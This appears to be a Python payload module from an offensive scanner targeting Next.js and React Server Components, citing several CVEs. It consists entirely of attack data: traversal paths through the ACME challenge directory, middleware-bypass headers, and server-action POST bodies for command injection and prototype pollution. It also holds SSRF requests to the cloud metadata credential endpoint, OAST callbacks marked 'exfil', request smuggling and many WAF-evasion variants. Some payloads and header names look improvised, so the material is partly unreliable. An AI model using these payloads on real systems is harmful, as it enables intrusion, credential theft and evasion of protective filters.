"""
Next.js / SSR Framework Payloads with WAF Bypass
Includes CVE-2024-34351, CVE-2025-55182, CVE-2025-66478
"""

# 3. Next.js / SSR frameworks - check for server-side data exposure  
NEXTJS_PAYLOADS = [
    "/.well-known/acme-challenge/{token}/../_next/static/chunks/main.js",
    "/.well-known/acme-challenge/{token}/../_next/data/",
    "/.well-known/acme-challenge/{token}/../api/",
    "/.well-known/acme-challenge/{token}/..;/api/health",
    "/.well-known/acme-challenge/{token}/..;/api/config",
    "/.well-known/acme-challenge/{token}/../_next/image",
    "/.well-known/acme-challenge/{token}/../__nextjs_original-stack-frame",
    "/.well-known/acme-challenge/{token}/../_next/static/development/_buildManifest.js",
    "/.well-known/acme-challenge/{token}/../_next/static/development/_ssgManifest.js",
]

# 3.1 Next.js RSC (React Server Components) RCE Payloads
# Based on CVE-2024-34351, CVE-2024-46982, CVE-2025-55182, CVE-2025-66478, and middleware bypass techniques
# Reference: https://assetnote.io/blog/nextjs-and-the-corrupt-middleware
NEXTJS_RSC_RCE_PAYLOADS = [
    # CVE-2024-34351: Server-Side Request Forgery via Server Actions
    # x-middleware-subrequest header bypass
    "/.well-known/acme-challenge/{token}/../",
    "/.well-known/acme-challenge/{token}/..%2f",
    "/.well-known/acme-challenge/{token}/%2e%2e/",
    
    # Middleware bypass paths - direct access to internal endpoints
    "/_next/server/pages/",
    "/_next/server/app/",
    "/_next/static/chunks/app/",
    
    # RSC payload endpoints - Server Actions  
    "/_next/data/development/index.json",
    "/_next/data/build-id/index.json",
    
    # ACME + RSC Combined attacks
    "/.well-known/acme-challenge/{token}/../_next/server/pages/api/",
    "/.well-known/acme-challenge/{token}/../_next/server/app/api/",
    "/.well-known/acme-challenge/{token}/..;/_next/data/",
    "/.well-known/acme-challenge/{token}/%2e%2e/_next/data/",
    
    # Internal rewrite bypass
    "/.well-known/acme-challenge/{token}/../_next/../admin",
    "/.well-known/acme-challenge/{token}/../_next/../api/internal",
    "/.well-known/acme-challenge/{token}/../_next/../.env",
    
    # Server Actions exploitation paths
    "/.well-known/acme-challenge/{token}/../__next_action",
    "/.well-known/acme-challenge/{token}/../__next_router_prefetch",
    "/.well-known/acme-challenge/{token}/../__next_form_state",
    
    # Turbopack/Webpack dev bypass
    "/.well-known/acme-challenge/{token}/../_next/development/_devMiddlewareManifest.json",
    "/.well-known/acme-challenge/{token}/../_next/development/_devPagesManifest.json",
    
    # App Router internals
    "/.well-known/acme-challenge/{token}/../_next/static/chunks/app-pages-internals.js",
    "/.well-known/acme-challenge/{token}/../_next/static/chunks/polyfills.js",
    "/.well-known/acme-challenge/{token}/../_next/static/chunks/webpack.js",
    
    # Source map leak (sensitive info)
    "/.well-known/acme-challenge/{token}/../_next/static/chunks/main.js.map",
    "/.well-known/acme-challenge/{token}/../_next/static/chunks/pages/_app.js.map",
    "/.well-known/acme-challenge/{token}/../_next/static/development/_buildManifest.js.map",
    
    # ============================================
    # CVE-2025-55182: RSC Streaming Response RCE
    # Exploits React Flight protocol parsing flaws
    # ============================================
    
    # RSC Flight stream injection via ACME bypass
    "/.well-known/acme-challenge/{token}/../_rsc",
    "/.well-known/acme-challenge/{token}/../__rsc__",
    "/.well-known/acme-challenge/{token}/../.rsc",
    "/.well-known/acme-challenge/{token}/..;/_rsc",
    
    # Server Component streaming endpoints
    "/.well-known/acme-challenge/{token}/../_next/rsc/",
    "/.well-known/acme-challenge/{token}/../_next/flight/",
    "/.well-known/acme-challenge/{token}/../__flight__/",
    "/.well-known/acme-challenge/{token}/../_next/stream/",
    
    # Direct RSC payload paths
    "/.well-known/acme-challenge/{token}/../_next/static/chunks/app/page.rsc",
    "/.well-known/acme-challenge/{token}/../_next/static/chunks/app/layout.rsc",
    "/.well-known/acme-challenge/{token}/../app/page.rsc",
    "/.well-known/acme-challenge/{token}/../app/layout.rsc",
    
    # Async component boundary bypass
    "/.well-known/acme-challenge/{token}/../_next/async-boundary",
    "/.well-known/acme-challenge/{token}/../__async_component__",
    "/.well-known/acme-challenge/{token}/../_next/suspense-boundary",
    
    # ============================================
    # CVE-2025-66478: Server Actions Deserialization RCE
    # Exploits unsafe deserialization in Server Actions
    # ============================================
    
    # Server Actions invoke endpoints
    "/.well-known/acme-challenge/{token}/../_next/server-action",
    "/.well-known/acme-challenge/{token}/../_server-action",
    "/.well-known/acme-challenge/{token}/../__server_action__",
    "/.well-known/acme-challenge/{token}/..;/__server_action__",
    
    # Action ID enumeration paths
    "/.well-known/acme-challenge/{token}/../_next/actions/",
    "/.well-known/acme-challenge/{token}/../_next/server-actions/",
    "/.well-known/acme-challenge/{token}/../.next/server/actions.json",
    "/.well-known/acme-challenge/{token}/../.next/server/server-reference-manifest.json",
    
    # Form action bypass
    "/.well-known/acme-challenge/{token}/../_next/form-action",
    "/.well-known/acme-challenge/{token}/../__form_action__",
    "/.well-known/acme-challenge/{token}/../_next/forms/",
    
    # Server reference manifest exposure
    "/.well-known/acme-challenge/{token}/../.next/server-reference-manifest.json",
    "/.well-known/acme-challenge/{token}/../.next/react-loadable-manifest.json",
    "/.well-known/acme-challenge/{token}/../.next/build-manifest.json",
    "/.well-known/acme-challenge/{token}/../.next/app-build-manifest.json",
    "/.well-known/acme-challenge/{token}/../.next/app-path-routes-manifest.json",
    
    # Prerender manifest (exposes routes)
    "/.well-known/acme-challenge/{token}/../.next/prerender-manifest.json",
    "/.well-known/acme-challenge/{token}/../.next/routes-manifest.json",
    "/.well-known/acme-challenge/{token}/../.next/middleware-manifest.json",
    
    # Internal API routes
    "/.well-known/acme-challenge/{token}/../_next/internal/",
    "/.well-known/acme-challenge/{token}/../_next/__internal__/",
    "/.well-known/acme-challenge/{token}/..;/_next/internal/api",
    
    # Cache poisoning via RSC
    "/.well-known/acme-challenge/{token}/../_next/cache/",
    "/.well-known/acme-challenge/{token}/../.next/cache/",
    "/.well-known/acme-challenge/{token}/../.next/cache/fetch-cache/",
]

# Next.js RSC RCE Headers for middleware bypass
# These headers are used with the payloads above
NEXTJS_RSC_BYPASS_HEADERS = [
    # CVE-2024-34351: x-middleware-subrequest bypass
    {"x-middleware-subrequest": "1"},
    {"x-middleware-subrequest": "middleware"},
    {"x-middleware-subrequest": "src/middleware"},
    {"x-middleware-subrequest": "pages/_middleware"},
    {"x-middleware-subrequest": "middleware:middleware"},
    {"x-middleware-subrequest": "src/middleware:src/middleware"},
    
    # Middleware path confusion
    {"x-middleware-prefetch": "1"},
    {"x-middleware-invoke": "1"},
    {"x-middleware-skip": "1"},
    
    # RSC headers
    {"rsc": "1"},
    {"next-action": "true"},
    {"next-router-prefetch": "1"},
    {"next-router-state-tree": "%5B%22%22%5D"},
    
    # CVE-2025-55182: RSC Streaming bypass headers
    {"rsc": "1", "accept": "text/x-component"},
    {"rsc": "1", "accept": "application/octet-stream"},
    {"next-rsc-flight": "1"},
    {"x-rsc-content-type": "text/x-component"},
    {"x-flight-request": "1"},
    {"accept": "text/x-component", "x-middleware-subrequest": "1"},
    
    # RSC streaming with custom payload marker
    {"rsc": "1", "x-rsc-payload": "true"},
    {"next-rsc": "1", "next-rsc-head": "true"},
    {"x-nextjs-rsc": "1"},
    
    # CVE-2025-66478: Server Actions deserialization bypass
    {"next-action": "true", "content-type": "application/json"},
    {"next-action": "true", "content-type": "multipart/form-data"},
    {"x-action-id": "default"},
    {"x-server-action": "1"},
    {"x-next-action": "1"},
    {"x-action-encrypted": "false"},
    {"x-action-state": "undefined"},
    
    # Combined CVE exploitation headers
    {"x-middleware-subrequest": "1", "rsc": "1", "next-action": "true"},
    {"x-middleware-subrequest": "middleware", "accept": "text/x-component"},
    {"x-middleware-skip": "1", "x-server-action": "1"},
    
    # Combined with Host manipulation
    {"x-middleware-subrequest": "1", "x-forwarded-host": "localhost"},
    {"x-middleware-subrequest": "1", "host": "localhost:3000"},
]

# Next.js RSC POST Payloads for Server Actions RCE
NEXTJS_RSC_POST_PAYLOADS = [
    # Server Action invoke attempts
    {
        "path": "/",
        "headers": {
            "Content-Type": "text/plain;charset=UTF-8",
            "Next-Action": "c3ab8ff13720e8ad9047dd39466b3c8974e592c",
            "Next-Router-State-Tree": "%5B%22%22%5D"
        },
        "body": '["$K1"]'
    },
    # SSRF via Server Action redirect
    {
        "path": "/api/",
        "headers": {
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary",
            "x-middleware-subrequest": "1"
        },
        "body": "------WebKitFormBoundary\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\n{callback}\r\n------WebKitFormBoundary--"
    },
    # RSC Flight payload
    {
        "path": "/_next/data/",
        "headers": {
            "Accept": "text/x-component",
            "rsc": "1"
        },
        "body": None
    },
    
    # ============================================
    # CVE-2025-55182: RSC Streaming Response RCE
    # Malicious Flight protocol payloads
    # ============================================
    
    # Flight stream injection payload
    {
        "path": "/",
        "headers": {
            "Accept": "text/x-component",
            "rsc": "1",
            "next-rsc-flight": "1",
            "Content-Type": "text/x-component"
        },
        "body": '0:["$","div",null,{"children":["$","$L1",null,{}]}]\n1:I["(app)/page.js",["app/page"],"default"]\n'
    },
    # RSC with suspense boundary bypass
    {
        "path": "/_rsc",
        "headers": {
            "Accept": "text/x-component",
            "rsc": "1",
            "x-middleware-subrequest": "1"
        },
        "body": '$Sreact.suspense\n$:["$","$Sreact.suspense",null,{"fallback":"loading","children":"$undefined"}]'
    },
    # Flight payload with server reference
    {
        "path": "/",
        "headers": {
            "Accept": "text/x-component",
            "rsc": "1",
            "next-action": "true"
        },
        "body": '{"id":"d9f9a1b2c3d4e5f6","bound":null}'
    },
    
    # ============================================
    # CVE-2025-66478: Server Actions Deserialization RCE
    # Malicious serialized payloads
    # ============================================
    
    # Deserialization gadget via Server Action
    {
        "path": "/",
        "headers": {
            "Content-Type": "multipart/form-data; boundary=----NextFormBoundary",
            "Next-Action": "1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d",
            "x-server-action": "1"
        },
        "body": "------NextFormBoundary\r\nContent-Disposition: form-data; name=\"1_$ACTION_ID_1a2b3c4d\"\r\n\r\n\r\n------NextFormBoundary\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n[\"$undefined\"]\r\n------NextFormBoundary--"
    },
    # Server Action with prototype pollution attempt
    {
        "path": "/",
        "headers": {
            "Content-Type": "application/json",
            "Next-Action": "proto-pollute-test",
            "x-action-encrypted": "false"
        },
        "body": '{"__proto__":{"admin":true},"constructor":{"prototype":{"admin":true}}}'
    },
    # Server Action with command injection in form field
    {
        "path": "/",
        "headers": {
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW",
            "Next-Action": "command-inject-test",
            "x-middleware-subrequest": "1"
        },
        "body": "------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"cmd\"\r\n\r\n$(id)\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--"
    },
    # SSRF via Action redirect header
    {
        "path": "/",
        "headers": {
            "Content-Type": "text/plain;charset=UTF-8",
            "Next-Action": "ssrf-redirect",
            "x-action-redirect": "http://169.254.169.254/latest/meta-data/",
            "x-middleware-subrequest": "1"
        },
        "body": '["$K1"]'
    },
    # Server Action with OAST callback
    {
        "path": "/",
        "headers": {
            "Content-Type": "application/json",
            "Next-Action": "oast-callback",
            "x-action-revalidate": "{callback}"
        },
        "body": '{"url":"{callback}","action":"fetch"}'
    },
    # Encrypted action bypass attempt
    {
        "path": "/",
        "headers": {
            "Content-Type": "text/plain",
            "Next-Action": "encrypted-bypass",
            "x-action-encrypted": "false",
            "x-action-closure-id": "internal"
        },
        "body": '["$F","internal-action",{"args":[]}]'
    },
    
    # ============================================
    # WAF BYPASS TECHNIQUES FOR POST PAYLOADS
    # ============================================
    
    # === URL Encoded Paths ===
    {
        "path": "/%2e%2e/%2e%2e/_next/server-action",
        "headers": {
            "Content-Type": "application/json",
            "Next-Action": "url-encoded-bypass",
            "x-middleware-subrequest": "1"
        },
        "body": '{"action":"test"}'
    },
    {
        "path": "/%252e%252e/%252e%252e/_next/data/",  # Double URL encoded
        "headers": {
            "Accept": "text/x-component",
            "rsc": "1",
            "x-middleware-subrequest": "middleware"
        },
        "body": None
    },
    
    # === ACME Path + WAF Bypass Combo ===
    {
        "path": "/.well-known/acme-challenge/test/../__server_action__",
        "headers": {
            "Content-Type": "application/json",
            "Next-Action": "acme-bypass",
            "x-middleware-subrequest": "1"
        },
        "body": '["$K1"]'
    },
    {
        "path": "/.well-known/acme-challenge/test/..%2f..%2f_rsc",
        "headers": {
            "Accept": "text/x-component",
            "rsc": "1",
            "next-rsc-flight": "1"
        },
        "body": '0:["$","div",null,{}]'
    },
    
    # === Case Manipulation WAF Bypass ===
    {
        "path": "/",
        "headers": {
            "Content-Type": "application/json",
            "NEXT-ACTION": "case-bypass-upper",  # Uppercase
            "X-MIDDLEWARE-SUBREQUEST": "1"
        },
        "body": '{"test":true}'
    },
    {
        "path": "/",
        "headers": {
            "Content-Type": "application/json",
            "NeXt-AcTiOn": "case-bypass-mixed",  # Mixed case
            "x-MiDdLeWaRe-SuBrEqUeSt": "1"
        },
        "body": '{"test":true}'
    },
    
    # === Header Injection/Smuggling WAF Bypass ===
    {
        "path": "/",
        "headers": {
            "Content-Type": "application/json",
            "Next-Action": "header-inject",
            "X-Forwarded-For": "127.0.0.1",
            "X-Real-IP": "127.0.0.1",
            "X-Originating-IP": "127.0.0.1",
            "x-middleware-subrequest": "1"
        },
        "body": '{"ip":"bypass"}'
    },
    {
        "path": "/",
        "headers": {
            "Content-Type": "application/json",
            "Next-Action": "host-override",
            "Host": "localhost",
            "X-Forwarded-Host": "localhost:3000",
            "X-Host": "127.0.0.1"
        },
        "body": '{"host":"bypass"}'
    },
    
    # === Content-Type Manipulation WAF Bypass ===
    {
        "path": "/",
        "headers": {
            "Content-Type": "text/plain; charset=utf-8",  # Different charset
            "Next-Action": "content-type-bypass1",
            "x-middleware-subrequest": "1"
        },
        "body": '["$K1"]'
    },
    {
        "path": "/",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "Next-Action": "content-type-bypass2",
            "x-middleware-subrequest": "1"
        },
        "body": "action=test&payload=%24K1"
    },
    {
        "path": "/",
        "headers": {
            "Content-Type": "application/json; charset=utf-16",
            "Next-Action": "charset-bypass",
            "x-middleware-subrequest": "1"
        },
        "body": '{"charset":"utf-16"}'
    },
    
    # === Chunked Transfer Encoding WAF Bypass ===
    {
        "path": "/",
        "headers": {
            "Content-Type": "application/json",
            "Transfer-Encoding": "chunked",
            "Next-Action": "chunked-bypass",
            "x-middleware-subrequest": "1"
        },
        "body": "7\r\n{\"a\":1}\r\n0\r\n\r\n"
    },
    
    # === Null Byte Injection WAF Bypass ===
    {
        "path": "/%00/../_next/server-action",
        "headers": {
            "Content-Type": "application/json",
            "Next-Action": "null-byte-path",
            "x-middleware-subrequest": "1"
        },
        "body": '{"null":"bypass"}'
    },
    {
        "path": "/",
        "headers": {
            "Content-Type": "application/json",
            "Next-Action": "null-byte-body",
            "x-middleware-subrequest": "1"
        },
        "body": '{"cmd":"id\\u0000"}'
    },
    
    # === Unicode/UTF-8 Overlong WAF Bypass ===
    {
        "path": "/..%c0%af..%c0%af_next/server-action",
        "headers": {
            "Content-Type": "application/json",
            "Next-Action": "unicode-overlong",
            "x-middleware-subrequest": "1"
        },
        "body": '{"unicode":"bypass"}'
    },
    {
        "path": "/..%ef%bc%8f..%ef%bc%8f_rsc",  # Fullwidth solidus
        "headers": {
            "Accept": "text/x-component",
            "rsc": "1"
        },
        "body": None
    },
    
    # === HTTP Parameter Pollution WAF Bypass ===
    {
        "path": "/?__nextAction=1&__nextAction=bypass",
        "headers": {
            "Content-Type": "application/json",
            "Next-Action": "hpp-bypass",
            "x-middleware-subrequest": "1"
        },
        "body": '{"hpp":true}'
    },
    
    # === JSON Smuggling WAF Bypass ===
    {
        "path": "/",
        "headers": {
            "Content-Type": "application/json",
            "Next-Action": "json-smuggle1",
            "x-middleware-subrequest": "1"
        },
        "body": '{"a":1}/*{"__proto__":{"admin":true}}*/'
    },
    {
        "path": "/",
        "headers": {
            "Content-Type": "application/json",
            "Next-Action": "json-smuggle2",
            "x-middleware-subrequest": "1"
        },
        "body": '{"a":1,"b":"test\\","c":"injected"}'
    },
    {
        "path": "/",
        "headers": {
            "Content-Type": "application/json",
            "Next-Action": "json-unicode",
            "x-middleware-subrequest": "1"
        },
        "body": '{"\\u0063\\u006d\\u0064":"\\u0069\\u0064"}'  # "cmd":"id" in unicode
    },
    
    # === Multipart Boundary Manipulation WAF Bypass ===
    {
        "path": "/",
        "headers": {
            "Content-Type": "multipart/form-data; boundary=----=_Part_0_1234567890",
            "Next-Action": "boundary-bypass1",
            "x-middleware-subrequest": "1"
        },
        "body": "------=_Part_0_1234567890\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\nbypass\r\n------=_Part_0_1234567890--"
    },
    {
        "path": "/",
        "headers": {
            "Content-Type": "multipart/form-data; boundary=\"nested\\\"boundary\"",
            "Next-Action": "boundary-bypass2",
            "x-middleware-subrequest": "1"
        },
        "body": "----nested\"boundary\r\nContent-Disposition: form-data; name=\"test\"\r\n\r\nvalue\r\n----nested\"boundary--"
    },
    
    # === Request Smuggling Attempts ===
    {
        "path": "/",
        "headers": {
            "Content-Type": "application/json",
            "Content-Length": "50",
            "Transfer-Encoding": "chunked",  # CL.TE
            "Next-Action": "smuggle-clte",
            "x-middleware-subrequest": "1"
        },
        "body": "0\r\n\r\nPOST /_next/server-action HTTP/1.1\r\nHost: localhost"
    },
    
    # === Cloudflare Specific WAF Bypass ===
    {
        "path": "/cdn-cgi/../_next/server-action",
        "headers": {
            "Content-Type": "application/json",
            "Next-Action": "cf-path-bypass",
            "x-middleware-subrequest": "1"
        },
        "body": '{"cf":"bypass"}'
    },
    {
        "path": "/",
        "headers": {
            "Content-Type": "application/json",
            "Next-Action": "cf-header-bypass",
            "CF-Connecting-IP": "127.0.0.1",
            "CF-IPCountry": "XX",
            "CF-RAY": "bypass",
            "x-middleware-subrequest": "1"
        },
        "body": '{"cf":"headers"}'
    },
    
    # === Method Override WAF Bypass ===
    {
        "path": "/",
        "headers": {
            "Content-Type": "application/json",
            "X-HTTP-Method-Override": "POST",
            "X-Method-Override": "POST",
            "Next-Action": "method-override",
            "x-middleware-subrequest": "1"
        },
        "body": '{"method":"override"}'
    },
    
    # === Accept Header Manipulation ===
    {
        "path": "/_rsc",
        "headers": {
            "Accept": "text/x-component, application/json, text/plain, */*",
            "rsc": "1",
            "x-middleware-subrequest": "1"
        },
        "body": None
    },
    {
        "path": "/",
        "headers": {
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "Next-Action": "accept-wildcard",
            "rsc": "1"
        },
        "body": '["$K1"]'
    },
    
    # === SSRF via WAF Bypass ===
    {
        "path": "/",
        "headers": {
            "Content-Type": "application/json",
            "Next-Action": "ssrf-localhost",
            "x-action-redirect": "http://127.0.0.1:3000/",
            "x-middleware-subrequest": "1"
        },
        "body": '{"url":"http://localhost/"}'
    },
    {
        "path": "/",
        "headers": {
            "Content-Type": "application/json",
            "Next-Action": "ssrf-metadata",
            "x-middleware-subrequest": "1"
        },
        "body": '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
    },
    {
        "path": "/",
        "headers": {
            "Content-Type": "application/json",
            "Next-Action": "ssrf-internal",
            "x-middleware-subrequest": "1"
        },
        "body": '{"url":"http://internal-service.local/admin"}'
    },
    
    # === Prototype Pollution with WAF Bypass ===
    {
        "path": "/",
        "headers": {
            "Content-Type": "application/json",
            "Next-Action": "proto-bypass1",
            "x-middleware-subrequest": "1"
        },
        "body": '{"__proto__":{"isAdmin":true}}'
    },
    {
        "path": "/",
        "headers": {
            "Content-Type": "application/json",
            "Next-Action": "proto-bypass2",
            "x-middleware-subrequest": "1"
        },
        "body": '{"constructor":{"prototype":{"isAdmin":true}}}'
    },
    {
        "path": "/",
        "headers": {
            "Content-Type": "application/json",
            "Next-Action": "proto-bypass3",
            "x-middleware-subrequest": "1"
        },
        "body": '{"a":{"__proto__":{"b":1}}}'  # Nested proto
    },
    
    # === Command Injection with WAF Bypass ===
    {
        "path": "/",
        "headers": {
            "Content-Type": "application/json",
            "Next-Action": "cmd-inject1",
            "x-middleware-subrequest": "1"
        },
        "body": '{"cmd":";id"}'
    },
    {
        "path": "/",
        "headers": {
            "Content-Type": "application/json",
            "Next-Action": "cmd-inject2",
            "x-middleware-subrequest": "1"
        },
        "body": '{"cmd":"|id"}'
    },
    {
        "path": "/",
        "headers": {
            "Content-Type": "application/json",
            "Next-Action": "cmd-inject3",
            "x-middleware-subrequest": "1"
        },
        "body": '{"cmd":"$(id)"}'
    },
    {
        "path": "/",
        "headers": {
            "Content-Type": "application/json",
            "Next-Action": "cmd-inject4",
            "x-middleware-subrequest": "1"
        },
        "body": '{"cmd":"`id`"}'
    },
    {
        "path": "/",
        "headers": {
            "Content-Type": "application/json",
            "Next-Action": "cmd-inject-encoded",
            "x-middleware-subrequest": "1"
        },
        "body": '{"cmd":"\\u003b\\u0069\\u0064"}'  # ;id in unicode
    },
    
    # === OAST/Callback with WAF Bypass ===
    {
        "path": "/",
        "headers": {
            "Content-Type": "application/json",
            "Next-Action": "oast-ssrf",
            "x-middleware-subrequest": "1"
        },
        "body": '{"url":"{callback}"}'
    },
    {
        "path": "/",
        "headers": {
            "Content-Type": "application/json",
            "Next-Action": "oast-redirect",
            "x-action-redirect": "{callback}",
            "x-middleware-subrequest": "1"
        },
        "body": '{"callback":true}'
    },
    {
        "path": "/",
        "headers": {
            "Content-Type": "application/json",
            "Next-Action": "oast-webhook",
            "x-middleware-subrequest": "1"
        },
        "body": '{"webhook":"{callback}","data":"exfil"}'
    },
]
